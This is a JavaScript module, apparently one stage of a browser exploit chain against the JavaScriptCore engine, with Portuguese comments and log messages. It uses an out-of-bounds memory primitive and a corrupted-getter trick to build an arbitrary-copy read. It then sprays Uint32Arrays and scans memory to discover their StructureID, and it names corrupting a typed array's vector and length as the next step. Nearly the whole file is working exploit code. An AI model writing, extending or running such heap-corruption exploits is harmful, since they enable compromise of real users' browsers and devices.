// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.15";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_15";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180;

let getter_copy_called_flag_v10_15 = false;

// !!!!! ESTE VALOR SERÁ O ALVO DA DESCOBERTA DESTE SCRIPT !!!!!
let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 43; // Novo placeholder


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA na v10.9/10.14)
// ============================================================
async function readFromOOBOffsetViaCopy_v10_15(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_15`;
    getter_copy_called_flag_v10_15 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }
    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_15 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                    }
                } else {
                    // Este log pode ser muito verboso durante um scan, remover se necessário
                    // logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] ERRO MÁGICA: effective_read_offset (${toHex(effective_read_offset)}) != dword_source_offset (${toHex(dword_source_offset_to_read_from)})! Qword@0x68 era ${qword_at_0x68.toString(true)}`, "critical", FNAME_PRIMITIVE);
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8);
                }
            } catch (e_getter) {
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_15_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5);

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_copy_called_flag_v10_15) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA
// ============================================================
async function getStructureIDFromOOB_v10_15(offset_of_jscell_in_oob) {
    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        return null;
    }
    const copied_qword = await readFromOOBOffsetViaCopy_v10_15(offset_of_jscell_in_oob);
    if (copied_qword &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) &&
        !(copied_qword.low() === 0xBAD68BAD && copied_qword.high() === 0xBAD68BAD) ) {
        return copied_qword.low();
    }
    return null;
}

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.15 - Foco na Descoberta de SID)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverSIDWithValidatedCopy_v10.15`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de SID de Uint32Array com Primitiva Validada ---`, "test", FNAME_CURRENT_TEST);

    let sprayedU32Arrays = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   OBJETIVO: Encontrar o StructureID de Uint32Array. Placeholder atual: ${toHex(PLACEHOLDER_SID_UINT32ARRAY)}`, "info", FNAME_CURRENT_TEST);

        // PASSO 1: Pulverizar Uint32Arrays e tentar encontrar seus StructureIDs
        logS3("PASSO 1: Pulverizando Uint32Arrays para descoberta de SID...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 300;
        const U32_SPRAY_LEN_BASE = 4;
        sprayedU32Arrays = [];
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedU32Arrays.push(new Uint32Array(U32_SPRAY_LEN_BASE + (i % 8)));
        }
        logS3(`  ${sprayedU32Arrays.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(500);

        let found_sids_map = {};
        const SCAN_START = 0x080; // Começar um pouco mais cedo (128 bytes)
        const SCAN_END = Math.min(0x7F00, oob_array_buffer_real.byteLength - 0x20); // Escanear quase todo o buffer de 32KB
        const SCAN_STEP_SID = 0x04; // Scan MUITO denso (a cada 4 bytes)

        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs... (PODE SER EXTREMAMENTE LENTO!)`, "warn", FNAME_CURRENT_TEST);
        let sids_found_in_scan = 0;
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;

        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
            let sid = await getStructureIDFromOOB_v10_15(offset); // Usa a primitiva atualizada
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF) {
                if (typeof known_ab_sid === 'number' && (sid & 0xFFFFFF00) === (known_ab_sid & 0xFFFFFF00)) {
                    continue; 
                }
                // Evitar log de padrões de preenchimento comuns se eles aparecerem como SID
                if ((sid & 0xFFFF0000) === 0xCAFE0000 || (sid & 0xFF000000) === 0xFACE0000 || (sid & 0xFFFF0000) === 0xBADB0000) {
                    continue;
                }
                
                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
                sids_found_in_scan++;

                if (found_sids_map[sid] <= 5) { // Loga as primeiras 5 ocorrências de um novo SID potencial
                     logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)} (Contagem: ${found_sids_map[sid]})`, "leak", FNAME_CURRENT_TEST);
                }
            }
            // Log de progresso menos frequente para scan denso
            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 1024) === 0) { // A cada ~4KB
                logS3(`    Scan em ${toHex(offset)}... SIDs únicos candidatos: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(10); 
            }
        }
        logS3(`  Scan concluído. Total de ${sids_found_in_scan} SIDs potenciais (filtrados) encontrados.`, "info", FNAME_CURRENT_TEST);

        let sorted_sids = Object.keys(found_sids_map).map(k => parseInt(k)).sort((a,b) => found_sids_map[b] - found_sids_map[a]);

        logS3("  Frequência dos SIDs encontrados (top 10 mais frequentes, filtrados):", "info", FNAME_CURRENT_TEST);
        let displayed_sids_count = 0;
        let most_frequent_sid_val = null; 
        let max_freq = 0;

        for(let i=0; i < sorted_sids.length; i++) {
            const sid_val = sorted_sids[i];
            const current_freq = found_sids_map[sid_val];
            // Filtro adicional para SIDs que parecem mais "reais"
            if (current_freq > 1 && sid_val > 0x100000 && sid_val < 0x7FFFFFFF) { // Ex: IDs entre ~1MB e ~2GB
                if (displayed_sids_count < 10) {
                    logS3(`    - SID: ${toHex(sid_val)}  Contagem: ${current_freq}`, "info", FNAME_CURRENT_TEST);
                    displayed_sids_count++;
                }
                if (current_freq > max_freq) {
                    max_freq = current_freq;
                    most_frequent_sid_val = sid_val;
                }
            }
        }
        
        if (most_frequent_sid_val !== null && max_freq > Math.min(NUM_U32_SPRAY / 25, 5)) { // Exigir uma frequência mínima
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
            logS3(`  !!!! StructureID MAIS FREQUENTE (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3("  Nenhum candidato a StructureID de Uint32Array suficientemente proeminente/confiável encontrado.", "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);

        // --- PASSO FUTURO: Usar o SID descoberto para corromper m_vector/m_length ---
        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
            logS3(`  Próximo passo: Usar SID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} para corromper um Uint32Array real.`, "info", FNAME_CURRENT_TEST);
        }


    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedU32Arrays = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
